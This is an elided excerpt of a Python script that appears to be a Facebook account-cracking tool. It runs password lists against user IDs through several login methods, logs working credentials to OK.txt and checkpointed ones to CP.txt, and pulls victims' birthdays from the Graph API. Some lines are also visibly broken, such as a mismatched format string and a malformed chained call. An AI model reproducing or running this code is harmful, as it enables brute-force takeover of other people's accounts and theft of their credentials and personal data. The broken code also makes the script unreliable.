...
def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		...
		#HAJI_NAJEEB('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
	else:
...
class __crack__:
	...
	def plerr(self):
		try:
			...
			print (' [*]=============================================')
			self.id = HAJI(self.apk).read().splitlines()
		...
		if _jokowi_kontol_ in ('M', 'm'):
				...
				if pwek == '':
					...
					def _sempak_(bse=None):
						...
						if boy == '':
							...
							HAJI_NAJEEB('[•] Result CP saved to CP.txt')
							HAJI_NAJEEB('\n\tCrack Processing...\n')
							HAJI_NAJEEB('\n\tCrack Processing...\n\n');logo()
							...
							exit()
					HAJI_NAJEEB('\n01.) Metode b-api ')
					HAJI_NAJEEB('02.) Metode mbasic ')
					HAJI_NAJEEB('03.) Metode Mobile ')
					_sempak_(pwek.split(','))
					break
			...
			HAJI_NAJEEB('\n\t------[ Method Crack ]-----')
			print (' [*]=============================================')
			HAJI_NAJEEB(' [1] HAJI Method 1 ')
			HAJI_NAJEEB(' [2] HAJI Method 2  [ Pro ]')
			HAJI_NAJEEB(' [3] HAJI Method 3   ')
			print (' [*]=============================================')
			self.__pler__()
		else:
			exit()
	...
	def __api__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;97m [HAJI] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			try:
				ua_xiaomi = HAJI('agent.txt', 'r').read()
			...
			if "access_token" in p:
				HAJI_NAJEEB('\r\033[1;92m[Successful-HAJI] %s | %s%s      '%(user,pw,tahun(user)))
				...
				try:
					token = HAJI('login.txt').read()
					cp_ttl = Prof_haji('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month]
					HAJI_NAJEEB('\r\033[1;91m[Checkpoint-HAJI] %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
					...
					pass
				HAJI_NAJEEB('\r\033[1;91m[Checkpoint-HAJI] %s | %s%s      '%(user,pw,tahun(user)))
				wrt = '%s - %s%s' % (user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				HAJI_NAJEEB('\r\033[1;32m[Successful-HAJI] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
				...
				try:
					token = HAJI('token.txt').read()
					cp_ttl = Prof_IMtiaz('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month].HAJI_NAJEEB('\r\033[1;91m[Checkpoint-AKING] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
					cp.append(wrt)
					open('CP.txt','a').write('%s\n' % wrt)
					break
	...
	def __mfb__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				HAJI_NAJEEB('\r\033[1;92m[Successful-HAJI] %s | %s      '%(user,pw))
				wrt = '%s - %s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
